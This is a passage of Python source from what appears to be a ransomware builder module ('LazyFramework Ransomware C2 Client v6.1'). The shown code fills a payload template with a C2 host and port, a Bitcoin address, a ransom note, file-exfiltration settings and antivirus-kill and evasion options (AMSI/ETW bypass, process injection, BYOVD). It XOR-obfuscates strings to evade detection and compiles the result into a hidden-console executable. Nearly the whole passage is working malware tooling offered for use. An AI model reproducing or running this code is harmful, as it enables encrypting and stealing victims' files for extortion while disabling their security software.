        print("[*] AV Kill: ENABLED (8 categories, 15+ methods)")
        print("    - Kill AV Processes")
        print("    - Disable AV Services")
        print("    - Tamper AV Registry")
        print("    - Unload AV Drivers")
        print("    - Disable Windows Defender")
        print("    - Add AV Exclusions")
        print("    - WMI Persistence")
        print("    - False Positive Trigger")
    
    if AV_BYPASS_ENABLED:
        print("[*] AV Bypass: ENABLED (7 categories, 12+ methods)")
        print("    - AMSI: 5 techniques")
        print("    - ETW: 3 techniques")
        print("    - DLL Unhooking")
        print("    - Direct Syscalls")
        print("    - Process Injection")
        print("    - Reflective PE Loading")
    
    if AV_KILL_ENABLED or AV_BYPASS_ENABLED:
        print("[*] Running AV Kill + Bypass...")
        full_av_kill_bypass()
    
    client = C2Client(C2_HOST, C2_PORT)
    if not client.connect():
        print("[!] Could not connect to C2, waiting...")
        time.sleep(5)
        if not client.connect():
            print("[!] Failed to connect, running standalone mode")
            if USE_GUI:
                try:
                    create_gui()
                    return
                except:
                    pass
            return

    if USE_GUI:
        try:
            t = threading.Thread(target=client.listen, daemon=True)
            t.start()
            print("[*] C2 listener started in background thread")
            create_gui()
            client.running = False
            try:
                client.socket.close()
            except:
                pass
        except Exception as e:
            print("[!] GUI error: " + str(e))
            client.listen()
    else:
        client.listen()

if __name__ == "__main__":
    main()
'''

        # ===== REPLACE PLACEHOLDER =====
        encryptor_script = payload_template.replace(
            "ENCRYPTION_PLACEHOLDER", str(encryption)
        ).replace(
            "TARGET_OS_PLACEHOLDER", str(target_os)
        ).replace(
            "AV_CODE_PLACEHOLDER", av_code
        ).replace(
            "LHOST_PLACEHOLDER", str(lhost)
        ).replace(
            "LPORT_PLACEHOLDER", str(lport)
        ).replace(
            "EXT_LIST_PLACEHOLDER", ext_list_str
        ).replace(
            "BTC_ADDRESS_PLACEHOLDER", btc_address
        ).replace(
            "WALLPAPER_STR_PLACEHOLDER", wallpaper_str
        ).replace(
            "COUNTDOWN_SECONDS_PLACEHOLDER", str(countdown_seconds)
        ).replace(
            "EXFILTRATE_STR_PLACEHOLDER", exfiltrate_str
        ).replace(
            "MAX_FILE_SIZE_MB_PLACEHOLDER", str(max_file_size_mb)
        ).replace(
            "USE_GUI_STR_PLACEHOLDER", use_gui_str
        ).replace(
            "DECRYPT_KEY_PLACEHOLDER", decrypt_key
        ).replace(
            "AV_KILL_STR_PLACEHOLDER", av_kill_str
        ).replace(
            "AV_BYPASS_STR_PLACEHOLDER", av_bypass_str
        ).replace(
            "PRIVILEGE_ESC_STR_PLACEHOLDER", privilege_esc_str
        ).replace(
            "PARALLEL_STR_PLACEHOLDER", parallel_str
        ).replace(
            "THREAD_COUNT_PLACEHOLDER", str(thread_count)
        ).replace(
            "DLL_SIDELOADING_STR_PLACEHOLDER", dll_sideloading_str
        ).replace(
            "BYOVD_STR_PLACEHOLDER", byovd_str
        ).replace(
            "DESKTOP_ICON_STR_PLACEHOLDER", desktop_icon_change_str
        ).replace(
            "PROCESS_INJECTION_STR_PLACEHOLDER", process_injection_str
        ).replace(
            "AMSI_BYPASS_STR_PLACEHOLDER", amsi_bypass_str
        ).replace(
            "ETW_BYPASS_STR_PLACEHOLDER", etw_bypass_str
        ).replace(
            "DLL_UNHOOKING_STR_PLACEHOLDER", dll_unhooking_str
        ).replace(
            "SYSCALL_DIRECT_STR_PLACEHOLDER", syscall_direct_str
        ).replace(
            "REFLECTIVE_PE_STR_PLACEHOLDER", reflective_pe_str
        ).replace(
            "MAX_RECONNECT_STR_PLACEHOLDER", str(max_reconnect_attempts)
        ).replace(
            "RANSOM_NOTE_PLACEHOLDER", ransom_note_escaped
        )

        # ===== OBFUSCATION - FIXED: Only apply if level >= 3 and safe =====
        if (av_kill or av_bypass) and obfuscation_level >= 3:
            import re
            
            def safe_obfuscate(code):
                """Safe obfuscation that doesn't break syntax"""
                # Only obfuscate simple strings, skip complex ones
                pattern = r'"([^"\\]*(?:\\.[^"\\]*)*)"'
                
                def encrypt_match(match):
                    s = match.group(1)
                    # Skip if string contains special characters or is too short
                    if len(s) < 5 or '%' in s or '\\' in s or '{' in s or '}' in s:
                        return match.group(0)
                    # Simple XOR obfuscation
                    encrypted = ''.join(chr(ord(c) ^ 0x55) for c in s)
                    return f'__("{encrypted}")'
                
                # Add decryptor function at the top if not already there
                if '__(' not in code:
                    decryptor = 'def __(s, k=0x55):\n    return "".join(chr(ord(c) ^ k) for c in s)\n\n'
                    code = decryptor + code
                
                # Apply obfuscation
                obfuscated = re.sub(pattern, encrypt_match, code)
                return obfuscated
            
            encryptor_script = safe_obfuscate(encryptor_script)

        return {
            "python": encryptor_script,
            "script": encryptor_script,
            "decrypt_key": decrypt_key,
            "features": {
                "av_kill": av_kill,
                "av_bypass": av_bypass,
                "obfuscation_level": obfuscation_level,
                "amsi_bypass": amsi_bypass,
                "etw_bypass": etw_bypass,
                "dll_unhooking": dll_unhooking,
                "syscall_direct": syscall_direct,
                "process_injection": process_injection,
                "reflective_pe": reflective_pe,
                "dll_sideloading": dll_sideloading,
                "byovd": byovd,
                "desktop_icon": desktop_icon_change,
                "target_os": target_os,
                "encryption": encryption,
                "max_reconnect_attempts": max_reconnect_attempts
            }
        }

    @staticmethod
    def build_exe(payload_script, exe_name="ransomware_payload", icon_path=None, output_dir=None, target_os="windows"):
        """Build EXE - FIXED: Better error handling and Python version compatibility"""
        os.environ['PYINSTALLER_NO_ROOT'] = '1'
        os.environ['PYI_NO_ROOT'] = '1'

        if output_dir is None:
            output_dir = str(Path.home() / "lazyframework_payloads")

        current_os = plat.system().lower()
        
        os_map = {
            "windows": ["windows"],
            "linux": ["linux"],
            "macos": ["darwin"]
        }
        
        compatible_os = os_map.get(target_os, [])
        
        if current_os not in compatible_os:
            return None, f"Cannot build {target_os} on {current_os}. Build on {target_os} machine."

        try:
            import PyInstaller
        except ImportError:
            return None, "PyInstaller not installed. Install: pip install pyinstaller"

        try:
            temp_dir = Path.home() / ".lazyframework" / "temp"
            if temp_dir.exists():
                shutil.rmtree(temp_dir, ignore_errors=True)
            temp_dir.mkdir(parents=True, exist_ok=True)

            script_path = temp_dir / "payload.py"
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(payload_script)

            # Validate Python syntax before building
            try:
                import py_compile
                py_compile.compile(str(script_path), doraise=True)
            except py_compile.PyCompileError as e:
                return None, f"Syntax error in payload: {e}"

            icon_arg = None
            if icon_path and os.path.exists(icon_path):
                icon_arg = icon_path

            build_output_dir = temp_dir / "dist"
            build_dir = temp_dir / "build"
            spec_dir = temp_dir

            if build_output_dir.exists():
                shutil.rmtree(build_output_dir, ignore_errors=True)
            if build_dir.exists():
                shutil.rmtree(build_dir, ignore_errors=True)

            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--noconsole",
                "--name", exe_name,
                "--distpath", str(build_output_dir),
                "--workpath", str(build_dir),
                "--specpath", str(spec_dir),
                "--log-level", "WARN",
                "--hidden-import=pycryptodome",
                "--hidden-import=Crypto",
                "--hidden-import=pillow",
                "--hidden-import=PIL",
                "--strip",
                "--optimize", "2",
            ]

            if target_os == "macos":
                cmd.extend(["--osx-bundle-identifier", "com.lazyframework.ransomware"])
                cmd.extend(["--target-architecture", "universal2"])

            if icon_arg and os.path.exists(icon_arg):
                cmd.extend(["--icon", icon_arg])

            cmd.append(str(script_path))

            print(f"[*] Building for target OS: {target_os} on {current_os}")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=str(temp_dir),
                timeout=300
            )

            if result.returncode == 0:
                exe_file = None
                
                if build_output_dir.exists():
                    for f in build_output_dir.iterdir():
                        if f.is_file() or f.is_dir():
                            exe_file = f
                            break

                if not exe_file:
                    expected_names = []
                    
                    if target_os == "windows":
                        expected_names = [f"{exe_name}.exe"]
                    elif target_os == "macos":
                        expected_names = [f"{exe_name}.app", exe_name]
                    else:
                        expected_names = [exe_name]
                    
                    for name in expected_names:
                        test_file = build_output_dir / name
                        if test_file.exists():
                            exe_file = test_file
                            break

                if exe_file and exe_file.exists():
                    output_path = Path(output_dir)
                    output_path.mkdir(parents=True, exist_ok=True)

                    if target_os == "windows":
                        final_name = exe_name + '.exe'
                    elif target_os == "macos":
                        if exe_file.is_dir() and exe_file.suffix == '.app':
                            final_name = exe_name + '.app'
                        else:
                            final_name = exe_name
                    else:
                        final_name = exe_name

                    final_file = output_path / final_name
                    
                    if exe_file.is_dir():
                        shutil.copytree(exe_file, final_file, dirs_exist_ok=True)
                    else:
                        shutil.copy2(exe_file, final_file)
                    
                    if target_os == "linux":
                        try:
                            os.chmod(final_file, 0o755)
                        except:
                            pass
                    
                    print(f"[+] Built: {final_file}")
                    if final_file.is_file():
                        print(f"[+] Size: {os.path.getsize(final_file):,} bytes")
                    return str(final_file), None
                else:
                    return None, f"Executable not found in {build_output_dir}"
            else:
                error_msg = result.stderr if result.stderr else result.stdout
                # Check for syntax error specifically
                if "Syntax error" in error_msg:
                    # Try to find the actual error line
                    lines = error_msg.split('\n')
                    for line in lines:
                        if "SyntaxError" in line or "Syntax error" in line:
                            return None, f"Syntax error: {line}"
                return None, f"PyInstaller error: {error_msg[:500] if error_msg else 'Unknown error'}"

        except subprocess.TimeoutExpired:
            return None, "Build timeout (300s)"
        except Exception as e:
            return None, f"Build error: {str(e)}"


def run(session, options):
    """Main module execution"""
    import os
    from pathlib import Path
    from datetime import datetime
    import platform as plat
    
    lhost = options.get("LHOST", "127.0.0.1")
    lport = int(options.get("LPORT", 4444))
    encryption = options.get("ENCRYPTION", "xchacha20")
    extensions = options.get("EXTENSIONS", "txt,doc,docx,pdf,jpg,png,xls,xlsx,ppt,pptx,zip,rar,7z,db,sql,py,js,html,css,json,xml,csv")
    ransom_note = options.get("RANSOM_NOTE", "YOUR FILES ARE ENCRYPTED!\\nSend BTC to address...")
    btc_address = options.get("BTC_ADDRESS", "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
    wallpaper = str(options.get("WALLPAPER", "true")).lower() == "true"
    countdown = int(options.get("COUNTDOWN_SECONDS", 300))
    exfiltrate = str(options.get("EXFILTRATE_FILES", "true")).lower() == "true"
    max_size = int(options.get("MAX_FILE_SIZE_MB", 10))
    use_gui = str(options.get("GUI_MODE", "true")).lower() == "true"
    decrypt_key = options.get("DECRYPT_KEY", "")
    av_kill = str(options.get("AV_KILL", "true")).lower() == "true"
    av_bypass = str(options.get("AV_BYPASS", "true")).lower() == "true"
    privilege_esc = str(options.get("PRIVILEGE_ESCALATION", "true")).lower() == "true"
    parallel = str(options.get("PARALLEL_ENCRYPTION", "true")).lower() == "true"
    thread_count = int(options.get("THREAD_COUNT", 4))
    target_os = options.get("TARGET_OS", "windows")
    dll_sideloading = str(options.get("DLL_SIDELOADING", "true")).lower() == "true"
    byovd = str(options.get("BYOVD", "true")).lower() == "true"
    desktop_icon_change = str(options.get("DESKTOP_ICON_CHANGE", "true")).lower() == "true"
    obfuscation_level = int(options.get("OBFUSCATION_LEVEL", 0))
    process_injection = str(options.get("PROCESS_INJECTION", "true")).lower() == "true"
    amsi_bypass = str(options.get("AMSI_BYPASS", "true")).lower() == "true"
    etw_bypass = str(options.get("ETW_BYPASS", "true")).lower() == "true"
    dll_unhooking = str(options.get("DLL_UNHOOKING", "true")).lower() == "true"
    syscall_direct = str(options.get("SYSCALL_DIRECT", "true")).lower() == "true"
    reflective_pe = str(options.get("REFLECTIVE_PE", "true")).lower() == "true"
    av_defender_disable = str(options.get("AV_DEFENDER_DISABLE", "true")).lower() == "true"
    av_process_kill = str(options.get("AV_PROCESS_KILL", "true")).lower() == "true"
    av_service_disable = str(options.get("AV_SERVICE_DISABLE", "true")).lower() == "true"
    av_registry_tamper = str(options.get("AV_REGISTRY_TAMPER", "true")).lower() == "true"
    av_driver_unload = str(options.get("AV_DRIVER_UNLOAD", "true")).lower() == "true"
    wmi_event_subscribe = str(options.get("WMI_EVENT_SUBSCRIBE", "true")).lower() == "true"
    output_format = options.get("OUTPUT_FORMAT", "python")
    output_filename = options.get("OUTPUT_FILENAME", "ransomware_payload")
    max_reconnect_attempts = int(options.get("MAX_RECONNECT_ATTEMPTS", 2))
    
    output_dir = str(Path.home() / "lazyframework_payloads")
    
    try:
        os.makedirs(output_dir, exist_ok=True)
        print(f"[*] Output directory: {output_dir}")
    except Exception as e:
        print(f"[!] Could not create output dir: {e}")
        output_dir = os.getcwd()
        print(f"[*] Using current directory: {output_dir}")

    current_os = plat.system().lower()
    
    encryption_display = str(encryption).upper()
    av_kill_display = str(av_kill)
    av_bypass_display = str(av_bypass)

    print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║         LAZYFRAMEWORK RANSOMWARE C2 CLIENT v6.1                    ║
║     AV Kill (15+ methods) + Bypass (12+ methods) + Encryption     ║
╠══════════════════════════════════════════════════════════════════════╣
║  LHOST             : {lhost}
║  LPORT             : {lport}
║  ENCRYPTION        : {encryption_display}
║  TARGET_OS         : {target_os}
║  CURRENT_OS        : {current_os}
║  OUTPUT_FORMAT     : {output_format}
║  AV_KILL           : {av_kill_display} (15+ methods)
║  AV_BYPASS         : {av_bypass_display} (12+ methods)
║  OBFUSCATION_LEVEL : {obfuscation_level}/5
║  MAX_RECONNECT     : {max_reconnect_attempts}
║  DECRYPT_KEY       : Auto-generated
╚══════════════════════════════════════════════════════════════════════╝
""")

    builder = RansomwareBuilder()
    result = builder.generate_payload(
        lhost, lport, encryption, extensions, ransom_note, btc_address, wallpaper,
        countdown, exfiltrate, max_size, use_gui, decrypt_key,
        av_kill, av_bypass, privilege_esc, parallel, thread_count, target_os,
        True, True, "all", "192.168.1.0/24,10.0.0.0/24", 10, True,
        dll_sideloading, byovd, desktop_icon_change, obfuscation_level,
        process_injection, amsi_bypass, etw_bypass,
        dll_unhooking, syscall_direct, reflective_pe,
        av_defender_disable, av_process_kill, av_service_disable,
        av_registry_tamper, av_driver_unload, wmi_event_subscribe,
        max_reconnect_attempts
    )

    print("\n[+] RANSOMWARE C2 CLIENT GENERATED (v6.1)")
    print("="*60)
    print(f"\n Algorithm: {str(encryption).upper()}")
    print(f" Decryption Key: {result['decrypt_key']}")
    print(f" Target OS: {target_os}")
    print(f" AV Kill: {result['features']['av_kill']} (15+ methods)")
    print(f" AV Bypass: {result['features']['av_bypass']} (12+ methods)")
    print(f"   - AMSI: {result['features']['amsi_bypass']} (5 techniques)")
    print(f"   - ETW: {result['features']['etw_bypass']} (3 techniques)")
    print(f"   - DLL Unhooking: {result['features']['dll_unhooking']}")
    print(f"   - Direct Syscalls: {result['features']['syscall_direct']}")
    print(f"   - Process Injection: {result['features']['process_injection']}")
    print(f"   - Reflective PE: {result['features']['reflective_pe']}")
    print(f"   - Max Reconnect: {result['features']['max_reconnect_attempts']}")
    print(f" Obfuscation Level: {result['features']['obfuscation_level']}/5")
    
    # Save payload
    try:
        py_file = os.path.join(output_dir, f"{output_filename}.py")
        with open(py_file, 'w', encoding='utf-8') as f:
            f.write(result["python"])
        print(f"\n[+] Python script saved to: {py_file}")
        
        if output_format == "exe":
            compatible_os = {"windows": ["windows"], "linux": ["linux"], "macos": ["darwin"]}
            if current_os in compatible_os.get(target_os, []):
                print(f"[*] Building {target_os} executable...")
                exe_path, error = builder.build_exe(
                    result["python"],
                    output_filename,
                    None,
                    output_dir,
                    target_os
                )
                if exe_path:
                    print(f"[+] {str(target_os).upper()} executable saved to: {exe_path}")
                    if target_os == "windows":
                        print(f"[+] Extension: .exe")
                    elif target_os == "macos":
                        print(f"[+] Extension: .app (bundle)")
                    else:
                        print(f"[+] Extension: (no extension - binary)")
                else:
                    print(f"[!] Build failed: {error}")
                    print("[!] Python script available as fallback")
            else:
                print(f"""
[!] Cannot build {target_os} on {current_os}
    
    SOLUTION: Build on the target OS:
    
    For {str(target_os).upper()}:
      1. Copy this script to {target_os} machine
      2. Run: python3 -c "from modules.payload.ransomware_builder import run; run({{}}, {{'LHOST':'{lhost}','OUTPUT_FORMAT':'exe','TARGET_OS':'{target_os}'}})"
""")
        
        file_size = os.path.getsize(py_file)
        print(f"\n[+] Python script size: {file_size:,} bytes")
        print(f"[+] Decryption Key: {result['decrypt_key']}")
        
        info_file = os.path.join(output_dir, f"{output_filename}_info.txt")
        with open(info_file, 'w', encoding='utf-8') as f:
            f.write(f"""
╔══════════════════════════════════════════════════════════════════════╗
║         RANSOMWARE PAYLOAD INFORMATION                              ║
╠══════════════════════════════════════════════════════════════════════╣
║  Generated     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
║  LHOST         : {lhost}
║  LPORT         : {lport}
║  ENCRYPTION    : {str(encryption).upper()}
║  DECRYPT_KEY   : {result['decrypt_key']}
║  TARGET_OS     : {target_os}
║  OUTPUT_FORMAT : {output_format}
║  AV_KILL       : {av_kill} (15+ methods)
║  AV_BYPASS     : {av_bypass} (12+ methods)
║  AMSI          : {amsi_bypass} (5 techniques)
║  ETW           : {etw_bypass} (3 techniques)
║  DLL_UNHOOKING : {dll_unhooking}
║  SYSCALL       : {syscall_direct}
║  PROCESS_INJ   : {process_injection}
║  REFLECTIVE_PE : {reflective_pe}
║  DLL_SIDELOAD  : {dll_sideloading}
║  BYOVD         : {byovd}
║  DESKTOP_ICON  : {desktop_icon_change}
║  MAX_RECONNECT : {max_reconnect_attempts}
║  OBFUSCATION   : {obfuscation_level}/5
╚══════════════════════════════════════════════════════════════════════╝
""")
        print(f"[+] Info saved to: {info_file}")
        
    except Exception as e:
        print(f"[!] Could not save payload: {e}")
    
    print("\n" + "="*60)

    return result["python"]
